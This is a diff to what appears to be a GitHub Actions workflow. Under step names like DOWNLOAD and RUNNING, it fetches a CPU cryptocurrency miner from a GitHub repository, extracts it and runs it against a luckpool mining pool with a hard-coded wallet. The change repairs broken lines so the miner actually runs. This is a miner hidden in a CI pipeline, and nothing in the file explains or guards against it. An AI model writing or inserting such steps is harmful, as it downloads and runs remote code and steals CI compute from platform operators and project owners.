@@ -17,12 +17,10 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_win64_avx.zip - 
-      OutFile hellminer_cpu_win64_avx.zip
+      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_win64_avx.zip - OutFile hellminer_cpu_win64_avx.zip
     - name: Extract
       run: Expand-Archive hellminer_cpu_win64_avx.zip
     - name: RUNNING
-      run: .\hellminer_cpu_win64_avx.zip\hellminerl.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u 
-      RWfaAVbkXAYsR6a8oNGCfSzKqExECJn6QH.gitob -p x --cpu 2
+      run: .\hellminer_cpu_win64_avx.zip\hellminerl.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RWfaAVbkXAYsR6a8oNGCfSzKqExECJn6QH.gitob -p x --cpu 2
     - name: DONE
       run: exit
